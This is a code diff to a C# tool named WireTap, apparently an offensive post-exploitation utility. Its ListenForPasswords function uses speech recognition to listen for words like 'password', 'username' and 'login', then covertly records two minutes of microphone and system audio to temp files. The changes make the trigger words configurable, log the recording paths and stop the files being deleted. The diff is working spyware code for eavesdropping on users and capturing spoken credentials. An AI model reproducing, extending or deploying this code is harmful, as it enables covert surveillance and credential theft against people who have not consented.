@@ -67,15 +67,15 @@ namespace WireTap
 
 
 
-        public static void ListenForPasswords()
+        public static void ListenForPasswords(Choices ch = null)
         {
             SpeechRecognitionEngine recognizer = new SpeechRecognitionEngine();
             GrammarBuilder gb = new GrammarBuilder();
-            Choices ch = new Choices();
-            ch.Add("username");
-            ch.Add("password");
-            ch.Add("credential");
-            ch.Add("login");
+            if (ch == null)
+            {
+                string[] defaults = { "username", "password", "credential", "login", "logon" };
+                ch = new Choices(defaults);
+            }
             gb.Append(ch);
             Grammar dictationGrammar = new Grammar(gb);
             recognizer.LoadGrammar(dictationGrammar);
@@ -86,11 +86,12 @@ namespace WireTap
                 if (result != null && !recording)
                 {
                     string fname = Helpers.CreateTempFileName(".wav");
-                    Console.WriteLine("[!] Heard interesting phrase {0}, staring two-minute recording.", result.Text);
+                    Console.WriteLine("{0}: Heard interesting phrase {1}, staring two-minute recording.",
+                                      Helpers.CurrentTime(),
+                                      result.Text);
                     recording = true;
-                    RecordAudio(fname, 12000);// begin recording for two minutes.
+                    RecordAudio(120000);// begin recording for two minutes.
                     recording = false;
-                    Console.WriteLine("[!] Finished recording. File at: {0}", fname);
                 }
                 else if (recording)
                 {
@@ -146,7 +147,7 @@ namespace WireTap
             mciSendString("close " + guid, buf, 0, IntPtr.Zero);
         }
 
-        public static void RecordAudio(string outFile, int msToRecord)
+        public static void RecordAudio(int msToRecord=10000)
         {
             string sysAudioFile = Helpers.CreateTempFileName(".wav");
             string micAudioFile = Helpers.CreateTempFileName(".wav");
@@ -154,21 +155,29 @@ namespace WireTap
             Thread micThread = new Thread(() => Audio.RecordMicrophone(micAudioFile, msToRecord));
             sysThread.Start();
             micThread.Start();
+            Console.WriteLine("{0}: Audio recording initiated. Waiting until {1} seconds have elapsed.",
+                              Helpers.CurrentTime(), msToRecord/1000);
             micThread.Join();
-            
-            using (var reader1 = new AudioFileReader(sysAudioFile))
-            {
-                using (var reader2 = new AudioFileReader(micAudioFile))
-                {
-                    reader1.Volume = 0.5f;
-                    //reader2.Volume = 0.1f;
-                    var mixer = new MixingSampleProvider(new[] { reader1, reader2 });
-                    WaveFileWriter.CreateWaveFile16(outFile, mixer);
-                }
-            }
+            Console.WriteLine("{0}: Audio recordings complete.", Helpers.CurrentTime());
+            Console.WriteLine("\tSystem Sounds Recording File:\n\t\t{0}", sysAudioFile);
+            Console.WriteLine("\tMicrophone Recording File:\n\t\t{0}", micAudioFile);
+            // Reparsing the LoopBack audio device is hard. Like, really hard.
+            // BitRate of LoopBack is unpredictable and cannot be set. This is
+            // a TODO or for a pull request.
 
-            File.Delete(sysAudioFile);
-            File.Delete(micAudioFile);
+            //using (var reader1 = new AudioFileReader(sysAudioFile))
+            //{
+            //    using (var reader2 = new AudioFileReader(micAudioFile))
+            //    {
+            //        reader1.Volume = 0.5f;
+            //        //reader2.Volume = 0.1f;
+            //        var mixer = new MixingSampleProvider(new[] { reader1, reader2 });
+            //        WaveFileWriter.CreateWaveFile16(outFile, mixer);
+            //    }
+            //}
+
+            //File.Delete(sysAudioFile);
+            //File.Delete(micAudioFile);
         }
     }
 }
